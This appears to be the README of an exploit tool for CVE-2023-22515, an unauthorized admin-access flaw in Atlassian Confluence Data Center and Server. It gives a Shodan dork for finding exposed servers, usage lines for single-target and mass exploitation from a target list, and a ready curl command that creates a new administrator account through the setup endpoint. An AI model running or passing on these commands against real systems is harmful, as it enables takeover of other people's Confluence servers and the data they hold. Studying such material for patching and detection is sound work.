# CVE-2023-22515

![](https://img.shields.io/static/v1?label=Product&message=Atlassian%20Confluence&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=Confluence%20Data%20Center%20and%20Server&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%2010.%20Unauthorized%20Admin%20Access&color=red)

- Shodan dork:
```
http.favicon.hash:-305179312
```

### Install
```
pip install -r requirements.txt
```

### Usage

```
python3 exploit.py normal https://example.com/confluence
```

```
python3 exploit.py mass targets.txt
```
### Curl PoC
```
curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=YourNewAdminLogin&fullName=admin&email=admin@confluence&password=YourNewAdminPass&confirm=YourNewAdminPass&setup-next-button=Next" http://URL/confluence/setup/setupadministrator.action
```
```
Login: YourNewAdminLogin
Pass:  YourNewAdminPass
```
